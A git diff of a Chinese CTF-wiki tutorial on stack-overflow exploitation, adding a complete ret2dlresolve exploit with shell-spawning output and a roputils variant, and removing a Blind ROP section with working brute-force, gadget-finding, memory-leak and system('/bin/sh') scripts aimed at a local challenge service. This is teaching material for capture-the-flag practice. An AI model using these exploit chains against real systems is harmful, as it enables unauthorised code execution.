+r.recvuntil('Welcome to XDCTF2015~!\n')
+
+# stack privot to bss segment
+# new stack size is 0x800
+stack_size = 0x800
+base_stage = bss_addr + stack_size
+## padding
+rop.raw('a' * offset)
+## read 100 byte to base_stage
+rop.read(0, base_stage, 100)
+## stack privot, set esp = base_stage
+rop.migrate(base_stage)
+r.sendline(rop.chain())
+
+# write sh="/bin/sh"
+rop = ROP('./main')
+sh = "/bin/sh"
+
+plt0 = elf.get_section_by_name('.plt').header.sh_addr
+rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
+dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
+dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
+
+## making fake write symbol
+fake_sym_addr = base_stage + 32
+align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
+                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10
+fake_sym_addr = fake_sym_addr + align
+index_dynsym = (
+    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
+# plus 10 since the size of Elf32_Sym is 16.
+st_name = fake_sym_addr + 0x10 - dynstr
+fake_write_sym = flat([st_name, 0, 0, 0x12])
+
+## making fake write relocation
+
+# making base_stage+24 ---> fake reloc
+index_offset = base_stage + 24 - rel_plt
+write_got = elf.got['write']
+r_info = (index_dynsym << 8) | 0x7
+fake_write_reloc = flat([write_got, r_info])
+
+rop.raw(plt0)
+rop.raw(index_offset)
+# fake ret addr of write
+rop.raw('bbbb')
+rop.raw(base_stage + 82)
+rop.raw('bbbb')
+rop.raw('bbbb')
+rop.raw(fake_write_reloc)  # fake write reloc
+rop.raw('a' * align)  # padding
+rop.raw(fake_write_sym)  # fake write symbol
+rop.raw('system\x00')  # there must be a \x00 to mark the end of string
+rop.raw('a' * (80 - len(rop.chain())))
+print rop.dump()
+print len(rop.chain())
+rop.raw(sh + '\x00')
+rop.raw('a' * (100 - len(rop.chain())))
+
+r.sendline(rop.chain())
+r.interactive()
+```
+
+需要注意的是，这里我'/bin/sh'的偏移我修改为了82，这是因为pwntools中它会自动帮你对齐字符串。。。下面这一行说明了问题。
+
+```
+0x0050:           'aara'
+```
+
+效果如下
+
+```shell
+➜  ret2dlresolve git:(master) ✗ python stage6.py
+[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Starting local process './main': pid 130415
+[*] Loaded cached gadgets for './main'
+0x0000:        0x8048380
+0x0004:           0x2528
+0x0008:           'bbbb' 'bbbb'
+0x000c:        0x804a892
+0x0010:           'bbbb' 'bbbb'
+0x0014:           'bbbb' 'bbbb'
+0x0018: '\x1c\xa0\x04\x08' '\x1c\xa0\x04\x08\x07i\x02\x00'
+0x001c:  '\x07i\x02\x00'
+0x0020:           'aaaa' 'aaaaaaaa'
+0x0024:           'aaaa'
+0x0028:  '\x00&\x00\x00' '\x00&\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00'
+0x002c: '\x00\x00\x00\x00'
+0x0030: '\x00\x00\x00\x00'
+0x0034: '\x12\x00\x00\x00'
+0x0038:           'syst' 'system\x00'
+0x003c:        'em\x00o'
+0x0040:             'aa'
+0x0044:           'aaaa' 'aaaaaaaaaaaaaa'
+0x0048:           'aaaa'
+0x004c:           'aaaa'
+0x0050:           'aara'
+82
+[*] Switching to interactive mode
+/bin/sh: 1: xa: not found
+$ ls
+core  main.c     stage2.py  stage4.py  stage6.py
+main  stage1.py  stage3.py  stage5.py
+```
+
+### 工具攻击
+
+根据上面的介绍，我们应该很容易可以理解这个攻击了。下面我们直接使用roputil来进行攻击。代码如下
+
+```python
+from roputils import *
+from pwn import process
+from pwn import gdb
+from pwn import context
+r = process('./main')
+context.log_level = 'debug'
+r.recv()
+
+rop = ROP('./main')
+offset = 112
+bss_base = rop.section('.bss')
+buf = rop.fill(offset)
+
+buf += rop.call('read', 0, bss_base, 100)
+# used to call dl_Resolve()
+buf += rop.dl_resolve_call(bss_base + 20, bss_base)
+r.send(buf)
+
+buf = rop.string('/bin/sh')
+buf += rop.fill(20, buf)
+# used to make faking data, such relocation, Symbol, Str
+buf += rop.dl_resolve_data(bss_base + 20, 'system')
+buf += rop.fill(100, buf)
+r.send(buf)
+r.interactive()
+```
+
+关于dl_resolve_call与dl_resolve_data的具体细节请参考roputils.py的源码，比较容易理解，需要注意的是，dl_resolve执行完之后也是需要有对应的返回地址的。
+
+效果如下
+
+```shell
+➜  ret2dlresolve git:(master) ✗ python roptool.py                       
+[+] Starting local process './main': pid 6114
+[DEBUG] Received 0x17 bytes:
+    'Welcome to XDCTF2015~!\n'
+[DEBUG] Sent 0x94 bytes:
+    00000000  46 4c 68 78  52 36 67 6e  65 47 53 58  71 77 51 49  │FLhx│R6gn│eGSX│qwQI│
+    00000010  32 43 6c 49  77 76 51 33  47 49 4a 59  50 74 6c 38  │2ClI│wvQ3│GIJY│Ptl8│
+    00000020  57 54 68 4a  63 48 39 62  46 55 52 58  50 73 38 64  │WThJ│cH9b│FURX│Ps8d│
+    00000030  72 4c 38 63  50 79 37 73  55 45 7a 32  6f 59 5a 42  │rL8c│Py7s│UEz2│oYZB│
+    00000040  76 59 32 43  74 75 77 6f  70 56 61 44  6a 73 35 6b  │vY2C│tuwo│pVaD│js5k│
+    00000050  41 77 78 77  49 72 7a 49  70 4d 31 67  52 6f 44 6f  │Awxw│IrzI│pM1g│RoDo│
+    00000060  43 44 43 6e  45 31 50 48  53 73 64 30  6d 54 7a 5a  │CDCn│E1PH│Ssd0│mTzZ│
+    00000070  a0 83 04 08  19 86 04 08  00 00 00 00  40 a0 04 08  │····│····│····│@···│
+    00000080  64 00 00 00  80 83 04 08  28 1d 00 00  79 83 04 08  │d···│····│(···│y···│
+    00000090  40 a0 04 08                                         │@···││
+    00000094
+[DEBUG] Sent 0x64 bytes:
+    00000000  2f 62 69 6e  2f 73 68 00  73 52 46 66  57 43 59 52  │/bin│/sh·│sRFf│WCYR│
+    00000010  66 4c 35 52  78 49 4c 53  54 a0 04 08  07 e9 01 00  │fL5R│xILS│T···│····│
+    00000020  6e 6b 45 32  52 76 73 6c  00 1e 00 00  00 00 00 00  │nkE2│Rvsl│····│····│
+    00000030  00 00 00 00  12 00 00 00  73 79 73 74  65 6d 00 74  │····│····│syst│em·t│
+    00000040  5a 4f 4e 6c  6c 73 4b 5a  76 53 48 6e  38 37 49 47  │ZONl│lsKZ│vSHn│87IG│
+    00000050  69 49 52 6c  50 44 38 67  45 77 75 6c  72 47 6f 67  │iIRl│PD8g│Ewul│rGog│
+    00000060  55 41 52 4f                                         │UARO││
+    00000064
+[*] Switching to interactive mode
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    'ls\n'
+[DEBUG] Received 0x8d bytes:
+    'core\t     main    roptool.py   roputils.pyc\tstage2.py  stage4.py  stage6.py\n'
+    '__init__.py  main.c  roputils.py  stage1.py\tstage3.py  stage5.py\n'
+core         main    roptool.py   roputils.pyc    stage2.py  stage4.py  stage6.py
+__init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py
+
 ```
 
 ## 题目
 
-- 2016 XDCTF pwn100
-- 2016 华山杯 SU_PWN
 
-参考阅读
-
-- http://wooyun.jozxing.cc/static/drops/papers-7551.html
-- http://wooyun.jozxing.cc/static/drops/binary-10638.html
-
-# ret2_dl_runtime_resolve
-
-参见http://wooyun.jozxing.cc/static/drops/binary-10638.html
-
-注意：
-
-- 可以控制6个寄存器rdi，rsi，rdx，rcx， r8，r9 
-- 需要控制rax寄存器的值
-- 可能被avx向量化
-
-# ret2reg
-
-## 原理
-
-1. 查看溢出函返回时哪个寄存值指向溢出缓冲区空间
-2. 然后反编译二进制，查找call reg 或者jmp reg指令，将 EIP设置为该指令地址
-3. reg所指向的空间上注入Shellcode(需要确保该空间是可以执行的，但通常都是栈上的)
 
 # SROP
 
@@ -454,7 +910,7 @@ SROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的
 
 **值得一提的是，在目前的pwntools中已经集成了对于srop的攻击。**
 
-## 攻击实例
+## 示例
 
 这里以360春秋杯中的smallest-pwn为例进行简单介绍。基本步骤如下
 
@@ -627,497 +1083,6 @@ mov ebp,esp
 
 - http://man7.org/linux/man-pages/man7/vdso.7.html
 - http://adam8157.info/blog/2011/10/linux-vdso/
-
-# BROP
-
-## 基本介绍
-
-BROP(Blind ROP)于2014年由Standford的Andrea Bittau提出，其相关研究成果发表在Oakland 2014，其论文题目是**Hacking Blind**，下面是作者对应的paper和slides,以及作者相应的介绍
-
-- [paper](http://www.scs.stanford.edu/brop/bittau-brop.pdf)
-- [slide](http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf)
-
-BROP是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流。
-
-## 攻击条件
-
-1. 源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。
-2. 服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有ASLR保护，但是其只是在程序最初启动的时候有效果）。目前nginx, MySQL, Apache, OpenSSH等服务器应用都是符合这种特性的。
-
-## 攻击原理
-
-目前，大部分应用都会开启ASLR、NX、Canary保护。这里我们分别讲解在BROP中如何绕过这些保护，以及如何进行攻击。
-
-### 基本思路
-
-在BROP中，基本的遵循的思路如下
-
-- 判断栈溢出字符串长度
-  - 暴力枚举
-- Stack Reading
-  - 获取栈上的数据来泄露canaries，以及ebp和返回地址。
-- Bind ROP
-  - 找到足够多的gadgets来控制输出函数的参数，并且对其进行调用，比如说常见的write函数以及puts函数。
-- Build the exploit
-  - 利用输出函数来dump出程序以便于来找到更多的gadgets，从而可以写出最后的exploit。
-
-### 栈溢出长度
-
-直接从1暴力枚举即可，直到发现程序崩溃。
-
-### Stack Reading
-
-如下所示，这是目前经典的栈布局
-
-```
-buffer|canary|saved fame pointer|saved returned address
-```
-
-要向得到canary以及之后的变量，我们需要解决第一个问题，如何得到overflow的长度，这个可以通过不断尝试来获取。
-
-其次，关于canary以及后面的变量，所采用的的方法一致，这里我们以canary为例。
-
-canary本身可以通过爆破来获取，但是如果只是愚蠢地枚举所有的数值的话，显然是低效的。
-
-需要注意的是，攻击条件2表明了程序本身并不会因为crash有变化，所以每次的canary等值都是一样的。所以我们可以按照字节进行爆破。正如论文中所展示的，每个字节最多有256种可能，所以在32位的情况下，我们最多需要爆破1024次，64位最多爆破2048次。
-
-![](/pwn/stackoverflow/figure/stack_reading.png)
-
-### Blind ROP
-
-#### 基本思路
-
-最朴素的执行write函数的方法就是构造系统调用。
-
-```assembly
-pop rdi; ret # socket
-pop rsi; ret # buffer
-pop rdx; ret # length
-pop rax; ret # write syscall number
-syscall
-```
-
-但通常来说，这样的方法都是比较困难的，因为想要找到一个syscall的地址基本不可能。。。我们可以通过转换为找write的方式来获取。
-
-##### BROP gadgets
-
-首先，在libc_csu_init的结尾一长串的gadgets，我们可以通过偏移来获取write函数调用的前两个参数。正如文中所展示的
-
-![](/pwn/stackoverflow/figure/brop_gadget.png)
-
-##### find a call write 
-
-我们可以通过plt表来获取write的地址。
-
-##### control rdx
-
-需要注意的是，rdx只是我们用来输出程序字节长度的变量，只要不为0即可。一般来说程序中的rdx经常性会不是零。但是为了更好地控制程序输出，我们仍然尽量可以控制这个值。但是，在程序
-
-```assembly
-pop rdx; ret
-```
-
-这样的指令几乎没有。那么，我们该如何控制rdx的数值呢？这里需要说明执行strcmp的时候，rdx会被设置为将要被比较的字符串的长度，所以我们可以找到strcmp函数，从而来控制rdx。
-
-那么接下来的问题，我们就可以分为两项
-
-- 寻找gadgets
-- 寻找PLT表
-  - write入口
-  - strcmp入口
-
-#### 寻找gadgets
-
-首先，我们来想办法寻找gadgets。此时，由于尚未知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的gadgets。而当我们控制程序的返回地址时，一般有以下几种情况
-
-- 程序直接崩溃
-- 程序运行一段时间后崩溃
-- 程序一直运行而并不崩溃
-
-为了寻找合理的gadgets，我们可以分为以下两步
-
-##### 寻找stop gadgets
-
-所谓`stop gadget`**一般**指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。
-
-> 其实stop gadget也并不一定得是上面的样子，其根本的目的在于告诉攻击者，所测试的返回地址是一个gadgets。
-
-之所以要寻找stop gadgets，是因为当我们猜到某个gadgtes后，如果我们仅仅是将其布置在栈上，由于执行完这个gadget之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会crash。这样的话，在攻击者看来程序只是单纯的crash了。因此，攻击者就会认为在这个过程中并没有执行到任何的`useful gadget`，从而放弃它。例子如下图
-
-![](/pwn/stackoverflow/figure/stop_gadget.png)
-
-但是，如果我们布置了`stop gadget`，那么对于我们所要尝试的每一个地址，如果它是一个gadget的话，那么程序不会崩溃。接下来，就是去想办法识别这些gadget。
-
-##### 识别 gadgets
-
-那么，我们该如何识别这些gadgets呢？我们可以通过栈布局以及程序的行为来进行识别。为了更加容易地进行介绍，这里定义栈上的三种地址
-
-- **Probe**
-  - 探针，也就是我们想要探测的代码地址。一般来说，都是64位程序，可以直接从0x400000尝试，如果不成功，有可能程序开启了PIE保护，再不济，就可能是程序是32位了。。这里我还没有特别想明白，怎么可以快速确定远程的位数。
-- **Stop**
-  - 不会使得程序崩溃的stop gadget的地址。
-- **Trap**
-  - 可以导致程序崩溃的地址
-
-我们可以通过在栈上摆放不同顺序的**Stop**与 **Trap**从而来识别出正在执行的指令。因为执行Stop意味着程序不会崩溃，执行Trap意味着程序会立即崩溃。这里给出几个例子
-
-- probe,stop,traps(traps,traps,...)
-  - 我们通过程序崩溃与否(**如果程序在probe处直接崩溃怎么判断**)可以找到不会对栈进行pop操作的gadget，如
-    - ret
-    - xor eax,eax; ret
-- probe,trap,stop,traps
-  - 我们可以通过这样的布局找到只是弹出一个栈变量的gadget。如
-    - pop rax; ret
-    - pop rdi; ret
-- probe, trap, trap, trap, trap, trap, trap, stop, traps
-  - 我们可以通过这样的布局来找到弹出6个栈变量的gadget，也就是与brop gadget相似的gadget。**这里感觉原文是有问题的，比如说如果遇到了只是pop一个栈变量的地址，其实也是不会崩溃的，，**这里一般来说会遇到两处比较有意思的地方
-    - plt处不会崩，，
-    - _start处不会崩，相当于程序重新执行。
-
-之所以要在每个布局的后面都放上trap，是为了能够识别出，当我们的probe处对应的地址执行的指令跳过了stop，程序立马崩溃的行为。
-
-但是，即使是这样，我们仍然难以识别出正在执行的gadget到底是在对哪个寄存器进行操作。
-
-但是，需要注意的是向BROP这样的一下子弹出6个寄存器的gadgets，程序中并不经常出现。所以，如果我们发现了这样的gadgets，那么，有很大的可能性，这个gadgets就是brop gadgets。此外，这个gadgets通过错位还可以生成
-
-- pop rsp
-
-等这样的gadgets，可以使得程序崩溃也可以作为识别这个gadgets的标志。
-
-
-
-**此外，根据我们之前学的ret2libc_csu_init可以知道该地址减去0x1a就会得到其上一个gadgets。可以供我们调用其它函数。**
-
-
-
-**需要注意的是probe可能是一个stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为trap地址即可。因为如果是stop gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思**
-
-#### 寻找PLT
-
-如下图所示，程序的plt表具有比较规整的结构，每一个plt表项都是16字节。而且，在每一个表项的6字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的got地址进行解析。 
-
-![](/pwn/stackoverflow/figure/brop_plt.png)
-
-此外，对于大多数plt调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为16的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了plt表。除此之外，我们还可以通过前后偏移6字节，来判断我们是处于plt表项中间还是说处于开头。
-
-#### 控制rdx
-
-当我们找到plt表之后，下面，我们就该想办法来控制rdx的数值了，那么该如何确认strcmp的位置呢？需要提前说的是，并不是所有的程序都会调用strcmp函数，所以在没有调用strcmp函数的情况下，我们就得利用其它方式来控制rdx的值了。这里给出程序中使用strcmp函数的情况。
-
-之前，我们已经找到了brop的gadgets，所以我们可以控制函数的前两个参数了。与此同时，我们定义以下两种地址
-
-- readable，可读的地址。
-- bad, 非法地址，不可访问，比如说0x0。
-
-那么我们如果控制传递的参数为这两种地址的组合，会出现以下四种情况
-
-- strcmp(bad,bad)
-- strcmp(bad,readable)
-- strcmp(readable,bad)
-- strcmp(readable,readable)
-
-只有最后一种格式，程序才会正常执行。
-
-**注**：在没有PIE保护的时候，64位程序的ELF文件的0x400000处有7个非零字节。
-
-那么我们该如何具体地去做呢？有一种比较直接的方法就是从头到尾依次扫描每个plt表项，但是这个却比较麻烦。我们可以选择如下的一种方法
-
-- 利用plt表项的慢路径
-- 并且利用下一个表项的慢路径的地址来覆盖返回地址
-
-这样，我们就不用来回控制相应的变量了。 
-
-当然，我们也可能碰巧找到strncmp或者strcasecmp函数，它们具有和strcmp一样的效果。
-
-#### 寻找输出函数
-
-寻找输出函数既可以寻找write，也可以寻找puts。一般现先找puts函数。不过这里为了介绍方便，先介绍如何寻找write。
-
-##### 寻找write@plt
-
-当我们可以控制write函数的三个参数的时候，我们就可以再次遍历所有的plt表，根据write函数将会输出内容来找到对应的函数。需要注意的是，这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下，我们有两种方法来找到这个值
-
-- 使用rop chain，同时使得每个rop对应的文件描述符不一样
-- 同时打开多个连接，并且我们使用相对较高的数值来试一试。
-
-需要注意的是
-
-- linux默认情况下，一个进程最多只能打开1024个文件描述符。
-- posix标准每次申请的文件描述符数值总是当前最小可用数值。
-
-当然，我们也可以选择寻找puts函数。
-
-##### 寻找puts@plt
-
-寻找puts函数(这里我们寻找的是 plt)，我们自然需要控制rdi参数，在上面，我们已经找到了brop gadget。那么，我们根据brop gadget偏移9可以得到相应的gadgets（由ret2libc_csu_init中后续可得）。同时在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为\x7fELF。所以我们可以根据这个来进行判断。一般来说，其payload如下
-
-```
-payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
-```
-
-### 攻击总结
-
-此时，攻击者已经可以控制输出函数了，那么攻击者就可以输出.text段更多的内容以便于来找到更多合适gadgets。同时，攻击者还可以找到一些其它函数，如dup2或者execve函数。一般来说，攻击者此时会去做下事情
-
-- 将socket输出重定向到输入输出
-- 寻找“/bin/sh”的地址。一般来说，最好是找到一块可写的内存，利用write函数将这个字符串写到相应的地址。
-- 执行execve获取shell，获取execve不一定在plt表中，此时攻击者就需要想办法执行系统调用了。
-
-
-## 例子
-
-这里我们以HCTF2016的出题人失踪了为例，相关的部署文件都放在了example文件夹下的对应目录下。基本思路如下
-
-### 确定栈溢出长度
-
-```python
-def getbufferflow_length():
-    i = 1
-    while 1:
-        try:
-            sh = remote('127.0.0.1', 9999)
-            sh.recvuntil('WelCome my friend,Do you know password?\n')
-            sh.sendline(i * 'a')
-            output = sh.recv()
-            sh.close()
-            if not output.startswith('No password'):
-                return i - 1
-            else:
-                i += 1
-        except EOFError:
-            sh.close()
-            return i - 1
-```
-
-根据上面，我们可以确定，栈溢出的长度为72。同时，根据回显信息可以发现程序并没有开启canary保护，否则，就会有相应的报错内容。所以我们不需要执行stack reading。
-
-### 寻找 stop gadgets
-
-寻找过程如下
-
-```python
-def get_stop_addr(length):
-    addr = 0x400000
-    while 1:
-        try:
-            sh = remote('127.0.0.1', 9999)
-            sh.recvuntil('password?\n')
-            payload = 'a' * length + p64(addr)
-            sh.sendline(payload)
-            sh.recv()
-            sh.close()
-            print 'one success addr: 0x%x' % (addr)
-            return addr
-        except Exception:
-            addr += 1
-            sh.close()
-```
-
-这里我们直接尝试64位程序没有开启PIE的情况，因为一般是这个样子的，，，如果开启了，，那就按照开启了的方法做，，结果发现了不少，，我选择了一个貌似返回到源程序中的地址
-
-```text
-one success stop gadget addr: 0x4006b6
-```
-
-### 识别brop gadgets
-
-下面，我们根据上面介绍的原理来得到对应的brop gadgets地址。构造如下，get_brop_gadget是为了得到可能的brop gadget，后面的check_brop_gadget是为了检查。
-
-```python
-def get_brop_gadget(length, stop_gadget, addr):
-    try:
-        sh = remote('127.0.0.1', 9999)
-        sh.recvuntil('password?\n')
-        payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(
-            stop_gadget) + p64(0) * 10
-        sh.sendline(payload)
-        content = sh.recv()
-        sh.close()
-        print content
-        # stop gadget returns memory
-        if not content.startswith('WelCome'):
-            return False
-        return True
-    except Exception:
-        sh.close()
-        return False
-
-
-def check_brop_gadget(length, addr):
-    try:
-        sh = remote('127.0.0.1', 9999)
-        sh.recvuntil('password?\n')
-        payload = 'a' * length + p64(addr) + 'a' * 8 * 10
-        sh.sendline(payload)
-        content = sh.recv()
-        sh.close()
-        return False
-    except Exception:
-        sh.close()
-        return True
-
-
-#length = getbufferflow_length()
-length = 72
-#get_stop_addr(length)
-stop_gadget = 0x4006b6
-addr = 0x400740
-while 1:
-    print hex(addr)
-    if get_brop_gadget(length, stop_gadget, addr):
-        print 'possible brop gadget: 0x%x' % addr
-        if check_brop_gadget(length, addr):
-            print 'success brop gadget: 0x%x' % addr
-            break
-    addr += 1
-```
-
-这样，我们基本得到了brop的gadgets地址0x4007ba
-
-### 确定puts@plt地址
-
-根据上面，所说我们可以构造如下payload来进行获取
-
-```text
-payload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)
-```
-
-具体函数如下
-
-```python
-def get_puts_addr(length, rdi_ret, stop_gadget):
-    addr = 0x400000
-    while 1:
-        print hex(addr)
-        sh = remote('127.0.0.1', 9999)
-        sh.recvuntil('password?\n')
-        payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(
-            addr) + p64(stop_gadget)
-        sh.sendline(payload)
-        try:
-            content = sh.recv()
-            if content.startswith('\x7fELF'):
-                print 'find puts@plt addr: 0x%x' % addr
-                return addr
-            sh.close()
-            addr += 1
-        except Exception:
-            sh.close()
-            addr += 1
-```
-
-最后根据plt的结构，选择0x400560作为puts@plt
-
-### 泄露puts@got地址
-
-在我们可以调用puts函数后，我们可以泄露puts函数的地址，进而获取libc版本，从而获取相关的system函数地址与/bin/sh地址，从而获取shell。我们从0x400000开始泄露0x1000个字节，这已经足够包含程序的plt部分了。代码如下
-
-```python
-def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):
-    sh = remote('127.0.0.1', 9999)
-    payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(
-        puts_plt) + p64(stop_gadget)
-    sh.recvuntil('password?\n')
-    sh.sendline(payload)
-    try:
-        data = sh.recv()
-        sh.close()
-        try:
-            data = data[:data.index("\nWelCome")]
-        except Exception:
-            data = data
-        if data == "":
-            data = '\x00'
-        return data
-    except Exception:
-        sh.close()
-        return None
-
-
-#length = getbufferflow_length()
-length = 72
-#stop_gadget = get_stop_addr(length)
-stop_gadget = 0x4006b6
-#brop_gadget = find_brop_gadget(length,stop_gadget)
-brop_gadget = 0x4007ba
-rdi_ret = brop_gadget + 9
-#puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)
-puts_plt = 0x400560
-addr = 0x400000
-result = ""
-while addr < 0x401000:
-    print hex(addr)
-    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)
-    if data is None:
-        continue
-    else:
-        result += data
-    addr += len(data)
-with open('code', 'wb') as f:
-    f.write(result)
-```
-
-最后，我们将泄露的内容写到文件里。需要注意的是如果泄露出来的是“”,那说明我们遇到了'\x00'，因为puts是输出字符串，字符串是以'\x00'为终止符的。之后利用ida打开binary模式，首先在edit->segments->rebase program 将程序的基地址改为0x400000，然后找到偏移0x560处，如下
-
-```text
-seg000:0000000000400560                 db 0FFh
-seg000:0000000000400561                 db  25h ; %
-seg000:0000000000400562                 db 0B2h ; 
-seg000:0000000000400563                 db  0Ah
-seg000:0000000000400564                 db  20h
-seg000:0000000000400565                 db    0
-```
-
-然后按下c,将此处的数据转换为汇编指令，如下
-
-```asm
-seg000:0000000000400560 ; ---------------------------------------------------------------------------
-seg000:0000000000400560                 jmp     qword ptr cs:601018h
-seg000:0000000000400566 ; ---------------------------------------------------------------------------
-seg000:0000000000400566                 push    0
-seg000:000000000040056B                 jmp     loc_400550
-seg000:000000000040056B ; ---------------------------------------------------------------------------
-```
-
-这说明，puts@got的地址为0x601018。
-
-### 程序利用
-
-```python
-#length = getbufferflow_length()
-length = 72
-#stop_gadget = get_stop_addr(length)
-stop_gadget = 0x4006b6
-#brop_gadget = find_brop_gadget(length,stop_gadget)
-brop_gadget = 0x4007ba
-rdi_ret = brop_gadget + 9
-#puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)
-puts_plt = 0x400560
-#leakfunction(length, rdi_ret, puts_plt, stop_gadget)
-puts_got = 0x601018
-
-sh = remote('127.0.0.1', 9999)
-sh.recvuntil('password?\n')
-payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(
-    stop_gadget)
-sh.sendline(payload)
-data = sh.recvuntil('\nWelCome', drop=True)
-puts_addr = u64(data.ljust(8, '\x00'))
-libc = LibcSearcher('puts', puts_addr)
-libc_base = puts_addr - libc.dump('puts')
-system_addr = libc_base + libc.dump('system')
-binsh_addr = libc_base + libc.dump('str_bin_sh')
-payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(
-    system_addr) + p64(stop_gadget)
-sh.sendline(payload)
-sh.interactive()
-```
-
-**参考阅读**
-
-- http://ytliu.info/blog/2014/09/28/blind-return-oriented-programming-brop-attack-gong-ji-yuan-li/
-- http://bobao.360.cn/learning/detail/3694.html
-- http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/
 
 # JOP
 
